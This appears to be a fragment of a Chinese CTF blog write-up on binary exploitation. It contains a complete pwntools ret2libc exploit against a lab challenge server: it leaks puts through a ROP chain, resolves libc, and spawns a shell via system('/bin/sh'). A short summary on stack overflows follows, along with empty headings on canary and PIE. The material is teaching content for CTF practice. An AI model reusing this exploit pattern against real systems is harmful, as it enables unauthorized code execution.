class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.anna.nssctf.cn&quot;</span>, <span class="number">28222</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">message: <span class="built_in">str</span>, payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendafter(message, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">message: <span class="built_in">str</span>, payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendlineafter(message, payload)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">numb = <span class="literal">None</span>, timeout: <span class="built_in">float</span> = <span class="number">5</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recv(numb, timeout)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>() -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recvline()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">message, drop: <span class="built_in">bool</span> = <span class="literal">False</span>, timeout: <span class="built_in">float</span> = <span class="number">5</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recvuntil(message, drop=drop, timeout=timeout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> u64(ru(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc</span>(<span class="params">fn_name: <span class="built_in">str</span>, fn_addr: <span class="built_in">int</span></span>) -&gt; LibcSearcher:</span><br><span class="line">    <span class="keyword">return</span> LibcSearcher(fn_name, fn_addr)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.interactive()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2libc&#x27;</span>)</span><br><span class="line">rdi = <span class="number">0x40117e</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"><span class="comment">#leak libc_base</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(rdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">ru(<span class="string">b&#x27;Go Go Go!!!\n&#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"><span class="comment">#get shell</span></span><br><span class="line">puts_addr = get_addr()</span><br><span class="line">libc = get_libc(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(ret) + p64(rdi) + p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">ru(<span class="string">b&#x27;Go Go Go!!!\n&#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><p><strong>栈溢出小结：栈溢出是为了覆写某些数据来达到攻击者目的的一种手段，不能只是简单的背了什么ret2text，ret2libc等题型模板，更重要的是理解这种手段。而且溢出不只是scanf，read，gets这些，strcpy也是可以的，因为本质上都是由一个缓冲区复制到另一个缓冲区。另外覆写的数据也不尽就是返回地址了，像刚才在覆盖到ret之前顺便覆盖了一个int变量，在这里没看到什么作用，但是假如是一个关键数据（比如一个随机数），就可以起到很大用处了。</strong></p><h2 id="ELF文件保护机制及基本绕过手法"><a href="#ELF文件保护机制及基本绕过手法" class="headerlink" title="ELF文件保护机制及基本绕过手法"></a>ELF文件保护机制及基本绕过手法</h2><h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
